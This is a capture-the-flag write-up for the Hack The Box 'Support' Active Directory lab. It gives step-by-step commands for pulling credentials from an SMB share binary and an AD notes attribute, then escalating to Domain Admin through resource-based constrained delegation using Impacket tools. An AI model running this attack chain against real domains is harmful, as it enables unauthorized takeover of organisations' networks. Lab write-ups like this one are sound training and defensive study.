# HTB Support — Writeup

**Author:** Almighty-Root  
**Target:** support.htb  
**Difficulty:** Easy  
**Domain:** SUPPORT.HTB  
**Category:** Active Directory

---

## Summary

Support is an Active Directory box where the foothold comes from decrypting a plaintext credential shipped inside a custom internal tool (`UserInfo.exe`), pivoting to a second credential stored in an AD user's `info` attribute, and escalating to Domain Admin via Resource-Based Constrained Delegation (RBCD) abuse — enabled by the low-privileged user holding `SeMachineAccountPrivilege` and a write ACL on the Domain Controller's computer object.

---

## 1. Recon

Standard nmap scan:

```bash
nmap -sV -sC -p- support.htb
```

The port list immediately confirmed this was a Domain Controller — DNS on 53, Kerberos on 88, RPC/SMB on 135/139/445, LDAP on 389/636/3268/3269. Domain came back as `support.htb`, host as `DC`.

---

## 2. Foothold — Credential Extraction from a Custom Binary

### 2.1 Null SMB session

First thing I tried was anonymous SMB access:

```bash
smbclient -L //<target-ip> -N
```

Got a list of shares including a non-default one: `support-tools`. Anonymous read access was open.

### 2.2 Downloading the tools share

```bash
smbclient '//<target-ip>/support-tools' -N -c 'prompt OFF; recurse ON; mget *'
```

The share contained internal admin utilities. One file stood out immediately: `UserInfo.exe` — a custom .NET tool used by support staff to query AD user info. Anything that talks to LDAP to look up users needs credentials to do it, which usually means they're stored somewhere inside.

### 2.3 Extracting the credential

Two ways to get the credential out of `UserInfo.exe`:

- **Dynamic analysis:** run it under `mono` while capturing traffic with `tcpdump` or Wireshark — the LDAP bind credential shows up in cleartext on the wire.
- **Static analysis:** decompile with ILSpy or AvaloniaILSpy, find the encoded credential and XOR key, decrypt manually.

Either way, the recovered credential was:

```
support.htb\ldap : <ldap-password>
```

> **Rabbit hole worth noting:** this password contains shell-special characters (`$`, `^`, `%`). Passing it unquoted on the command line causes bash to expand `$e7AclUf8x` and `$tRWxPWO1` as empty variables, silently truncating the password and producing `STATUS_LOGON_FAILURE` errors that look like the wrong password entirely. Always single-quote it.

---

## 3. LDAP Enumeration — Finding a Second Credential

With the `ldap` service account I could run authenticated LDAP queries. I validated the creds first:

```bash
netexec smb support.htb -u ldap -p '<ldap-password>'
netexec ldap support.htb -u ldap -p '<ldap-password>'
```

Both confirmed valid. I then ran a full LDAP dump and RID brute force to enumerate domain users:

```bash
lookupsid.py 'support.htb/ldap:<ldap-password>'@<target-ip>
ldapdomaindump -u 'support.htb\ldap' -p '<ldap-password>' <target-ip>
```

> **Rabbit hole:** `lookupsid.py` has no `-domain` flag. Passing `-domain support.htb` shifts the value into the positional `maxRid` argument and causes a `ValueError` crash. Domain goes inside the target string only.

RID brute force returned 20 accounts, including a `support` user. Given the box name, that was the obvious next target. I did a raw `ldapsearch` on that specific account to look at every attribute:

```bash
ldapsearch -H ldap://<target-ip> -x -D "ldap@support.htb" \
  -w '<ldap-password>' \
  -b "DC=support,DC=htb" "(samAccountName=support)"
```

The `info` attribute — an informal notes field that admins sometimes misuse — contained a plaintext password:

```
<support-password>
```

This is a common real-world pattern. `info` and `description` fields in AD are frequent dumping grounds for old or temp passwords. Worth checking on every engagement.

> **Rabbit hole:** `nxc`'s default `--users` output truncates and reformats fields — it won't surface `info` by default. The raw `ldapsearch` or `ldapdomaindump` output was needed to catch it.

---

## 4. User Shell — `support`

Tried the `info`-field password on the `support` account:

```bash
evil-winrm -i support.htb -u support -p '<support-password>'
```

Worked. Shell as `support.htb\support`. Grabbed the user flag from the desktop.

### 4.1 Privilege enumeration

```powershell
whoami /all
```

Key finding:

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

That's the pivot point — with `SeMachineAccountPrivilege`, any authenticated user can add up to 10 computer objects to the domain (controlled by the default `MachineAccountQuota` of 10). I also confirmed via BloodHound that `support` held a write ACL on the DC's computer object — the piece that makes RBCD actually work.

> **Rabbit hole:** I tried AS-REP roasting first, which returned nothing:
>
> ```bash
> GetNPUsers.py support.htb/ldap:'<ldap-password>' \
>   -dc-ip <target-ip> -request -format hashcat -outputfile asrep.txt
> ```
>
> "No entries found" — no accounts had pre-auth disabled. Dead end.
>
> I also tried Kerberoasting via `GetUserSPNs.py`, which repeatedly failed with `invalidCredentials` (`data 52e`) even though the same creds worked fine over SMB. Chased it through clock-skew fixes and flag-syntax checks before concluding no roastable SPNs existed anyway. Not the path.

---

## 5. Privilege Escalation — RBCD Abuse to Domain Admin

### 5.1 Add an attacker-controlled computer account

```bash
impacket-addcomputer 'support.htb/support:<support-password>' \
  -computer-name 'evilpc' -computer-pass 'evilpc123'
```

### 5.2 Configure RBCD on the DC

```bash
impacket-rbcd -delegate-from 'evilpc$' -delegate-to 'DC$' \
  -dc-ip <target-ip> -action 'write' \
  'support.htb/support:<support-password>'
```

This writes `evilpc$` into the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute — the DC now trusts `evilpc$` to delegate authentication on its behalf.

### 5.3 Request a service ticket impersonating Administrator

```bash
getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator \
  -dc-ip <target-ip> 'support.htb/evilpc$:evilpc123'
```

This performs S4U2Self then S4U2Proxy and saves a `.ccache` file.

> **Rabbit hole:** The last step initially failed with `STATUS_MORE_PROCESSING_REQUIRED`. Root cause: `KRB5CCNAME` was set with the wrong filename case (`DC.support.htb` vs the actual `dc.support.htb`). Linux filenames are case-sensitive. The error gives no hint that it's a missing-file issue rather than an auth failure. Fix: copy the exact filename from `getST.py`'s output rather than retyping it.

### 5.4 Shell as Administrator

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
psexec.py -dc-ip <target-ip> -no-pass -k support.htb/administrator@dc.support.htb
```

Shell landed as `NT AUTHORITY\SYSTEM` on the DC. Grabbed the root flag.

---

## Timeline

| Stage | Action | Result |
|---|---|---|
| Recon | nmap, SMB null session | Found `support-tools` share |
| Cred 1 | Extract from `UserInfo.exe` | `ldap` service account |
| LDAP enum | `ldapdomaindump` / `ldapsearch` on `support` | Second cred in `info` attribute |
| Cred 2 | Password reuse | `support` shell via Evil-WinRM |
| Privesc discovery | `whoami /all` | `SeMachineAccountPrivilege` |
| Privesc discovery | BloodHound / ACL check | Write access on DC computer object |
| Exploit | `addcomputer` → `rbcd` → `getST` → `psexec` | SYSTEM on DC |

---

## CVE Note

No CVE applies. The exploited weaknesses are purely configuration and credential hygiene:
- Secret embedded in a distributed internal binary (MITRE T1552)
- Plaintext password stored in an AD notes attribute (MITRE T1552)
- RBCD misconfiguration via excessive ACL rights (MITRE T1558 — Kerberos delegation abuse)

---

## Tools Used

- `nmap`, `smbclient`, `netexec`
- Impacket: `lookupsid.py`, `GetNPUsers.py`, `GetUserSPNs.py`, `impacket-addcomputer`, `impacket-rbcd`, `getST.py`, `psexec.py`
- `ldapsearch`, `ldapdomaindump`, `bloodhound-python`
- `evil-winrm`
- ILSpy / AvaloniaILSpy

---

*Writeup by Gr4ndm4st3r*
